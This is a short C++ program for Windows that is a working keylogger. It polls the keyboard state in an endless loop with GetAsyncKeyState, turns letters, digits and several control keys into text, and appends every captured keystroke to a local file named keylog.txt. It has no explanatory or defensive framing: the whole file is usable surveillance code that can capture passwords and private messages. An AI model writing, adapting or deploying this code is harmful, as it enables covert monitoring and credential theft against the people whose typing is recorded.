#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void logKey(string key) {
    ofstream logFile("keylog.txt", ios::app);
    logFile << key;
    logFile.close();
}

string keyToString(int key) {
    if (key >= 0x30 && key <= 0x5A) return string(1, (char)key); // A-Z, 0-9
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_ESCAPE: return "[ESC]";
        default: return "";
    }
}

int main() {
    while (true) {
        Sleep(10); // small delay
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                string output = keyToString(key);
                if (!output.empty()) {
                    logKey(output);
                }
            }
        }
    }
    return 0;
}